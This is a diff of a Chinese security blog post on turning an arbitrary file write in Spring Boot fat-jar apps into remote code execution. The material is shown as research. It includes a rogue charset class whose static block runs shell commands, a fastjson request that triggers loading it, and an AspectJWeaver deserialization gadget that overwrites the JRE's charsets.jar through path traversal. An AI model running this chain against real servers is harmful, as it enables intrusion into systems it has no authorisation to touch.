@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>Godown_blog</title>
+  <title>Spring FatJar写文件到RCE | Godown_blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -591,43 +591,17 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('https://pic1.zhimg.com/80/v2-03a22891ccba9bccf6424dfd7cbf4be7_1440w.webp')">
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8124.png')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        
+        Spring FatJar写文件到RCE
       </span>
     </div>
     
-    
-      
-        <span class="post-detail-header_date">
-          <i class="fas fa-calendar"></i> 发表于：2024-12-19 |
-        </span>
-      
-
-      
-
-      
-        <div class="post-detail-header_wordcount">
-          <span class="totalcount">
-            <i class="fas fa-file-text-o"></i> 字数统计: 5k |
-          </span>
-  
-          <span class="min2read">
-            <i class="fas fa-clock"></i> 阅读时长: 26分钟 |
-          </span>
-  
-          
-            <span class="reading">
-              <i class="fas fa-eye"></i> 阅读量：<span id="busuanzi_value_page_pv"></span>
-            </span>
-          
-        </div>
-      
     
   </div>
   
@@ -741,6 +715,21 @@
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241218163839787.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241218163839787.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241218163839787"></p>
 <p>看到报错<code>unsupport charset &#39;evil&#39;</code>就代表成功触发</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241218163940697.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241218163940697.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241218163940697"></p>
+<p>继续看到Charset.forName，跟进到lookup</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219112229675.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219112229675.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241219112229675"></p>
+<p>继续跟到lookup2</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219112312794.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219112312794.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241219112312794"></p>
+<p>接连调用了<code>standardProvider.charsetForName</code>，<code>lookupExtendedCharset</code>，<code>lookupViaProviders</code></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219112345751.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219112345751.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241219112345751"></p>
+<p>先跟进到lookupExtendedCharset，看下这个静态字段extendedProvider哪来的</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219113348740.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219113348740.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241219113348740"></p>
+<p>extendedProvider字段来自其同名的方法</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219113434569.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219113434569.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241219113434569"></p>
+<p>该方法加载并返回了<code>sun.nio.cs.ext.ExtendedCharsets</code></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219113521885.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219113521885.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241219113521885"></p>
+<p>看到这个类的代码就明白，这是一个枚举所有字符类的集合</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219113637524.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219113637524.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241219113637524"></p>
+<p>后续制作charsets.jar时，这个类需要保留</p>
 <h3 id="cache触发"><a href="#cache触发" class="headerlink" title="cache触发"></a>cache触发</h3><p>可是网上的payload是<code>Accept: text/html;charset=evil;</code>触发到Charset.forName。我们从代码可以清楚地看到需要字符以<code>multipart</code>开头才会进入parseMimeTypeInternal</p>
 <p>重新调了一下，发现还有个触发栈可以触发Charset.forName</p>
 <p>看到parseMimeTypes的cachedMimeTypes</p>
@@ -759,7 +748,7 @@
 <p>直接解压了重新开个idea打开就行了</p>
 <p>目录如下：</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241218190526587.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241218190526587.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241218190526587"></p>
-<p>随便选一个sun.nio.cs.ext下的类进行覆盖就OK，为了保持最小体积，抛弃其他类（经测试需要保留ExtendedCharsets类，不然无法加载其他类）。这里就选择覆盖sun.nio.cs.ext.IBM33722</p>
+<p>随便选一个sun.nio.cs.ext下的类进行覆盖就OK，为了保持最小体积，抛弃其他类（需要保留ExtendedCharsets类，不然无法加载其他类）。这里就选择覆盖sun.nio.cs.ext.IBM33722</p>
 <p>Charset.forName加载类时，会完成类的初始化，进而触发static代码块</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sun.nio.cs.ext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IBM33722</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        fun();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IBM33722</span><span class="params">()</span>&#123;</span><br><span class="line">        fun();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> java.util.HashMap&lt;String, String&gt; <span class="title function_">fun</span><span class="params">()</span>&#123;</span><br><span class="line">        String[] command;</span><br><span class="line">        <span class="type">String</span> <span class="variable">random</span> <span class="operator">=</span> UUID.randomUUID().toString().replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;&quot;</span>).substring(<span class="number">1</span>,<span class="number">9</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">osName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osName.startsWith(<span class="string">&quot;Mac OS&quot;</span>)) &#123;</span><br><span class="line">            command = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;open -a Calculator&quot;</span>&#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (osName.startsWith(<span class="string">&quot;Windows&quot;</span>)) &#123;</span><br><span class="line">            command = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">new</span> <span class="title class_">java</span>.io.File(<span class="string">&quot;/bin/bash&quot;</span>).exists())&#123;</span><br><span class="line">                command = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;touch /tmp/charsets_test_&quot;</span> + random + <span class="string">&quot;.log&quot;</span>&#125;;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                command = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;touch /tmp/charsets_test_&quot;</span> + random + <span class="string">&quot;.log&quot;</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(command);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable e1)&#123;</span><br><span class="line">            e1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -790,16 +779,27 @@
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/fastjson</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-perl">&#123;</span></span><br><span class="line"><span class="language-perl">    <span class="string">&quot;x&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-perl">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.nio.charset.Charset&quot;</span>,</span></span><br><span class="line"><span class="language-perl">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;IBM33722&quot;</span></span></span><br><span class="line"><span class="language-perl">    &#125;</span></span><br><span class="line"><span class="language-perl">&#125;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/fastjson%E8%A7%A6%E5%8F%91charset%E5%8A%A0%E8%BD%BD.gif" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/fastjson%E8%A7%A6%E5%8F%91charset%E5%8A%A0%E8%BD%BD.gif" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="fastjson触发charset加载"></p>
-<h2 id="Trick3：AspectJWeaver写文件"><a href="#Trick3：AspectJWeaver写文件" class="headerlink" title="Trick3：AspectJWeaver写文件"></a>Trick3：AspectJWeaver写文件</h2><p>借助CC前半段触发<code>org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap#writeToPath</code>去写文件，然后选上面的Accept触发方式去RCE</p>
+<h3 id="Trick2-5：AspectJWeaver写文件"><a href="#Trick2-5：AspectJWeaver写文件" class="headerlink" title="Trick2.5：AspectJWeaver写文件"></a>Trick2.5：AspectJWeaver写文件</h3><p>借助CC前半段触发<code>org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap#writeToPath</code>去写文件，然后选上面的Accept触发方式去RCE</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">writeToPath_withCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;charsets.jar&quot;</span>));</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">storeableCachingMap</span> <span class="operator">=</span> (HashMap) constructor.newInstance(<span class="string">&quot;./&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//        storeableCachingMap.put(&quot;writeToPathFILE&quot;,code);</span></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazy</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(storeableCachingMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(code));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazy, <span class="string">&quot;../../usr/lib/jvm/java-1.8-openjdk/jre/lib/charsets.jar&quot;</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>AscpectJWeaver链见</p>
+<p>写文件的方式还有很多，比如SnakeYaml MarshalOutputStream写文件等</p>
 <p>另外还有jackson、JDBC、和一些代码直接初始化类加载的场景。但是这些漏洞一般没有写文件搭配，实用性不是很大，感兴趣可以去作者github</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks">https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks</a></p>
-<h3 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h3><p>snakeyaml反序列化也用到了SPI机制，我这把那段copy过来</p>
+<h2 id="Trick3：SPI机制"><a href="#Trick3：SPI机制" class="headerlink" title="Trick3：SPI机制"></a>Trick3：SPI机制</h2><p>snakeyaml反序列化也用到了SPI机制，把分析copy过来</p>
+<p>本来这一章是有的，复现完觉得linux下默认没有<code>jre/class</code>目录，利用情况太少了，又给删了。就这样吧！</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks">https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks</a></p>
 
       </div>
       <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/Spring/" class="">
+              Spring
+            </a>
+          
+        </div>
         
       </div>
       
@@ -810,7 +810,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2024/12/19/springboot-fatjar-xie-wen-jian-dao-rce/" target="_blank" title="">https://godownio.github.io/2024/12/19/springboot-fatjar-xie-wen-jian-dao-rce/</a>
+    <a href="/2024/12/19/springboot-fatjar-xie-wen-jian-dao-rce/" target="_blank" title="Spring FatJar写文件到RCE">https://godownio.github.io/2024/12/19/springboot-fatjar-xie-wen-jian-dao-rce/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -834,18 +834,15 @@
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8122.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8122.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8123.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8123.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
     </div>
-    <a href="/2024/12/09/2023ciscn-fu-xian/" class="post-nav-link">
+    <a href="/2024/12/19/aspectjweaver-fan-xu-lie-hua/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">2023CISCN 初赛WEB WP</div>
+        <div class="title-text">AspectJWeaver反序列化写文件</div>
       </div>
       <!-- <div class="content">
-        补课
-2023CISCNUnzip随便上传一个文件可以看到源码
-
-这段 PHP 代码的功能是允许用户上传一个文件，并检查
+        1234567&lt;dependencies&gt;    &lt;dependency&gt;        &lt
       </div> -->
     </a>
   </div>
@@ -983,7 +980,7 @@
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring-FatJar%E5%86%99%E6%96%87%E4%BB%B6%E5%88%B0RCE"><span class="toc-text">Spring FatJar写文件到RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-text">写文件路径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#question%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8A%A0%E8%BD%BD%E4%BA%86charsets"><span class="toc-text">question：为什么加载了charsets?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#question2%EF%BC%9AJAVA-HOME%E5%9C%A8%E5%93%AA%EF%BC%9F"><span class="toc-text">question2：JAVA HOME在哪？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trick1%EF%BC%9AAccept%E5%A4%B4"><span class="toc-text">Trick1：Accept头</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mutipart%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A6%E5%8F%91"><span class="toc-text">mutipart字符串触发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cache%E8%A7%A6%E5%8F%91"><span class="toc-text">cache触发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trick2%EF%BC%9Afastjson%E5%86%99%E6%96%87%E4%BB%B6-setter%E8%A7%A6%E5%8F%91"><span class="toc-text">Trick2：fastjson写文件+setter触发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trick3%EF%BC%9AAspectJWeaver%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-text">Trick3：AspectJWeaver写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SPI%E6%9C%BA%E5%88%B6"><span class="toc-text">SPI机制</span></a></li></ol></li></ol></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring-FatJar%E5%86%99%E6%96%87%E4%BB%B6%E5%88%B0RCE"><span class="toc-text">Spring FatJar写文件到RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-text">写文件路径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#question%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8A%A0%E8%BD%BD%E4%BA%86charsets"><span class="toc-text">question：为什么加载了charsets?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#question2%EF%BC%9AJAVA-HOME%E5%9C%A8%E5%93%AA%EF%BC%9F"><span class="toc-text">question2：JAVA HOME在哪？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trick1%EF%BC%9AAccept%E5%A4%B4"><span class="toc-text">Trick1：Accept头</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mutipart%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A6%E5%8F%91"><span class="toc-text">mutipart字符串触发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cache%E8%A7%A6%E5%8F%91"><span class="toc-text">cache触发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trick2%EF%BC%9Afastjson%E5%86%99%E6%96%87%E4%BB%B6-setter%E8%A7%A6%E5%8F%91"><span class="toc-text">Trick2：fastjson写文件+setter触发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick2-5%EF%BC%9AAspectJWeaver%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-text">Trick2.5：AspectJWeaver写文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trick3%EF%BC%9ASPI%E6%9C%BA%E5%88%B6"><span class="toc-text">Trick3：SPI机制</span></a></li></ol></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
@@ -1018,7 +1015,7 @@
             <div class="post-img-box">
               <a href="/2024/12/19/springboot-fatjar-xie-wen-jian-dao-rce/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic1.zhimg.com/80/v2-03a22891ccba9bccf6424dfd7cbf4be7_1440w.webp" class="lazyload placeholder" data-srcset="https://pic1.zhimg.com/80/v2-03a22891ccba9bccf6424dfd7cbf4be7_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8124.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8124.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -1027,7 +1024,28 @@
                   <span class="post-date">12-19</span>
                 
               </div>
-              <a class="post-title" href="/2024/12/19/springboot-fatjar-xie-wen-jian-dao-rce/">暂无标题</a>
+              <a class="post-title" href="/2024/12/19/springboot-fatjar-xie-wen-jian-dao-rce/">Spring FatJar写文件到RCE</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2024/12/19/aspectjweaver-fan-xu-lie-hua/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8123.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8123.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">12-19</span>
+                
+              </div>
+              <a class="post-title" href="/2024/12/19/aspectjweaver-fan-xu-lie-hua/">AspectJWeaver反序列化写文件</a>
             </div>
